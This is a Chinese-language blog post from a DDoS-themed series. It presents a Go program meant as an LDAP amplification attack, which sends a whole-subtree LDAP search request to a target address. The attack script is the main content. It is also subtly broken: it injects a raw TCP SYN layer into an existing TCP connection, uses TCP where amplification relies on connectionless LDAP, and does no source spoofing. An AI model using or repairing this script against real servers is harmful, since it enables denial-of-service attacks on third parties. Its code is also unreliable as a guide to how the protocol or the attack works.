---
author: Sunny Tsai
title: "[Day 22] 閑的沒事 - LDAP放大攻擊"
date: 2023-10-05
math: true
tags: [
    "cloud",
    "ldap",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
繼續昨天沒寫完的坑


```
func main() {

    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
    if err != nil {
        log.Fatalf("Failed to connnect target ip: %v", err)
    }
    defer conn.Close()

    ldapSearchRequest := LDAPSearchRequest{
        BaseDN:     "dc=example,dc=com",
        Scope:      2,  // Whole Subtree
        Filter:     "(objectClass=*)",
        Attributes: []string{"All User Attributes"},
    }

    ldapSearchRequestBytes, err := asn1.Marshal(ldapSearchRequest)
    if err != nil {
        log.Fatalf("Failed to encode LDAP search request : %v", err)
    }

    ldapPacket := gopacket.NewSerializeBuffer()
    opts := gopacket.SerializeOptions{}

    tcpLayer := &layers.TCP{
        SrcPort: layers.TCPPort(12345),
        DstPort: layers.TCPPort(389),
        Seq:     110,
        Ack:     200,
        SYN:     true,
        Window:  14600,
    }
    err = tcpLayer.SerializeTo(ldapPacket, opts)
    if err != nil {
        log.Fatalf("Failed to add to tcp layer: %v", err)
    }

    err = gopacket.SerializeLayers(ldapPacket, opts, gopacket.Payload(ldapSearchRequestBytes))
    if err != nil {
        log.Fatalf("Failed to add payload: %v", err)
    }

    _, err = conn.Write(ldapPacket.Bytes())
    if err != nil {
        log.Fatalf("Failed to send packet: %v", err)
    }

}

type LDAPSearchRequest struct {
    BaseDN     string   `asn1:"octetstring"`
    Scope      int      `asn1:"enumerated"`
    DerefAlias int      `asn1:"enumerated"`
    SizeLimit  int      `asn1:"integer"`
    TimeLimit  int      `asn1:"integer"`
    TypesOnly  bool     `asn1:"boolean"`
    Filter     string   `asn1:"octetstring"`
    Attributes []string `asn1:"set"`
}
```

原本要先從捕獲封包開始寫的，結果code不知道丟哪了
先用dial寫一個，休息一下
